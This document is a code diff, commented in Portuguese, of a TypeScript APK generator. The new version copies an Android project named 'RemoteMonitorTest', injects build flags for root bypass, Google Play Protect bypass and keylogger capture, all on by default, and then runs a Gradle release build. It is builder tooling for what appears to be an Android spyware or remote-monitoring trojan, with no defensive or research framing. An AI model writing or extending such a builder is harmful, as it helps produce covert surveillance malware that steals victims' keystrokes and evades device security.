@@ -1,9 +1,11 @@
-import https from 'https';
-import http from 'http';
+import fs from 'fs';
+import path from 'path';
+import { execSync } from 'child_process';
+import os from 'os';
 
 /**
- * Realiza download de APK de um URL externo (ex: GitHub)
- * O APK é hospedado no GitHub e apenas baixado daqui
+ * Gera APK customizado com build local via Gradle
+ * Injeta dinamicamente: enableRootBypass, enablePlayProtectBypass, enableKeylogCapture
  */
 export async function generateAPK(options: {
   appName: string;
@@ -19,71 +21,121 @@ export async function generateAPK(options: {
   enablePlayProtectBypass?: boolean;
   enableKeylogCapture?: boolean;
 }): Promise<Buffer> {
-  // URL do APK hospedado no GitHub (você preenche isso)
-  // Exemplo: https://github.com/seu-user/seu-repo/releases/download/v1.0.0/app.apk
-  const githubAPKUrl = process.env.APK_GITHUB_URL || '';
-
-  if (!githubAPKUrl) {
-    throw new Error('APK_GITHUB_URL não configurada no ambiente');
+  const sourceAndroidPath = path.join(process.cwd(), 'android', 'RemoteMonitorTest');
+  
+  if (!fs.existsSync(sourceAndroidPath)) {
+    throw new Error(`Projeto Android não encontrado em ${sourceAndroidPath}`);
   }
 
+  // Criar diretório temporário para build
+  const tempBuildDir = fs.mkdtempSync(path.join(os.tmpdir(), 'apk-build-'));
+  
   try {
-    // Baixar APK do GitHub
-    const apkBuffer = await downloadFile(githubAPKUrl);
-    if (!looksLikeApk(apkBuffer)) {
-      throw new Error('Conteúdo baixado não parece um APK válido');
+    console.log(`[APK Generator] Preparando build em ${tempBuildDir}`);
+    
+    // Copiar projeto Android para temp
+    copyDirRecursive(sourceAndroidPath, tempBuildDir);
+    
+    // Modificar build.gradle.kts com as flags customizadas
+    const buildGradlePath = path.join(tempBuildDir, 'app', 'build.gradle.kts');
+    modifyBuildGradle(buildGradlePath, options);
+    
+    // Executar build
+    console.log('[APK Generator] Executando Gradle build...');
+    const gradleCmd = process.platform === 'win32' 
+      ? path.join(tempBuildDir, 'gradlew.bat')
+      : path.join(tempBuildDir, 'gradlew');
+    
+    execSync(`${gradleCmd} assembleRelease`, {
+      cwd: tempBuildDir,
+      stdio: 'pipe',
+    });
+    
+    // Encontrar APK gerado
+    const apkPath = path.join(
+      tempBuildDir, 
+      'app', 
+      'build', 
+      'outputs', 
+      'apk', 
+      'release', 
+      'app-release.apk'
+    );
+    
+    if (!fs.existsSync(apkPath)) {
+      throw new Error(`APK não encontrado em ${apkPath}`);
     }
-    console.log(`[APK Generator] APK baixado do GitHub com sucesso: ${apkBuffer.length} bytes`);
+    
+    // Ler APK
+    const apkBuffer = fs.readFileSync(apkPath);
+    console.log(`[APK Generator] APK gerado com sucesso: ${apkBuffer.length} bytes`);
+    
     return apkBuffer;
-  } catch (error) {
-    console.error('[APK Generator] Erro ao baixar APK do GitHub:', error);
-    throw error instanceof Error
-      ? error
-      : new Error('Falha ao baixar APK do GitHub');
+  } finally {
+    // Limpar temp
+    try {
+      fs.rmSync(tempBuildDir, { recursive: true, force: true });
+    } catch (e) {
+      console.warn('[APK Generator] Erro ao limpar temp:', e);
+    }
   }
 }
 
 /**
- * Baixa arquivo da URL
+ * Copia diretório recursivamente
  */
-function downloadFile(url: string, redirectCount = 0): Promise<Buffer> {
-  return new Promise((resolve, reject) => {
-    if (redirectCount > 5) {
-      reject(new Error('Muitos redirecionamentos ao baixar APK'));
-      return;
-    }
-
-    const protocol = url.startsWith('https') ? https : http;
+function copyDirRecursive(src: string, dest: string) {
+  if (!fs.existsSync(dest)) {
+    fs.mkdirSync(dest, { recursive: true });
+  }
+  
+  const entries = fs.readdirSync(src, { withFileTypes: true });
+  for (const entry of entries) {
+    const srcPath = path.join(src, entry.name);
+    const destPath = path.join(dest, entry.name);
     
-    protocol.get(url, { timeout: 10000 }, (res) => {
-      const statusCode = res.statusCode ?? 0;
-      const location = res.headers.location;
-
-      if ([301, 302, 303, 307, 308].includes(statusCode) && location) {
-        const redirectUrl = new URL(location, url).toString();
-        res.resume();
-        downloadFile(redirectUrl, redirectCount + 1).then(resolve).catch(reject);
-        return;
-      }
-
-      if (statusCode !== 200) {
-        reject(new Error(`HTTP ${statusCode}: ${res.statusMessage}`));
-        return;
-      }
-      
-      const chunks: Buffer[] = [];
-      res.on('data', (chunk) => chunks.push(chunk));
-      res.on('end', () => resolve(Buffer.concat(chunks)));
-      res.on('error', reject);
-    }).on('error', reject);
-  });
+    if (entry.isDirectory()) {
+      copyDirRecursive(srcPath, destPath);
+    } else {
+      fs.copyFileSync(srcPath, destPath);
+    }
+  }
 }
 
-function looksLikeApk(buffer: Buffer): boolean {
-  if (buffer.length < 4) {
-    return false;
+/**
+ * Modifica build.gradle.kts para injetar flags customizadas
+ */
+function modifyBuildGradle(
+  buildGradlePath: string,
+  options: {
+    enableRootBypass?: boolean;
+    enablePlayProtectBypass?: boolean;
+    enableKeylogCapture?: boolean;
+    [key: string]: any;
   }
-
-  // APK é um ZIP: normalmente começa com PK\x03\x04.
-  return buffer[0] === 0x50 && buffer[1] === 0x4b;
+) {
+  let content = fs.readFileSync(buildGradlePath, 'utf-8');
+  
+  // Substituir/injetar buildConfigField dinamicamente
+  const buildConfigFields = [
+    `buildConfigField("Boolean", "ENABLE_ROOT_BYPASS", "${options.enableRootBypass ?? true}")`,
+    `buildConfigField("Boolean", "ENABLE_PLAY_PROTECT_BYPASS", "${options.enablePlayProtectBypass ?? true}")`,
+    `buildConfigField("Boolean", "ENABLE_KEYLOG_INJECTION", "${options.enableKeylogCapture ?? true}")`,
+  ].join('\n        ');
+  
+  // Encontrar a seção de buildConfigField e substituir
+  const buildConfigRegex = /buildConfigField\("Boolean", "ENABLE_ROOT_BYPASS".*?\n\s*buildConfigField\("Boolean", "ENABLE_KEYLOG_INJECTION"[^\n]*/s;
+  
+  if (buildConfigRegex.test(content)) {
+    content = content.replace(buildConfigRegex, buildConfigFields);
+  } else {
+    // Se não existir, tentar adicionar após "versionName"
+    content = content.replace(
+      /(versionName = "[^"]*")/,
+      `$1\n        ${buildConfigFields}`
+    );
+  }
+  
+  fs.writeFileSync(buildGradlePath, content, 'utf-8');
+  console.log('[APK Generator] Flags customizadas injetadas no build.gradle.kts');
 }
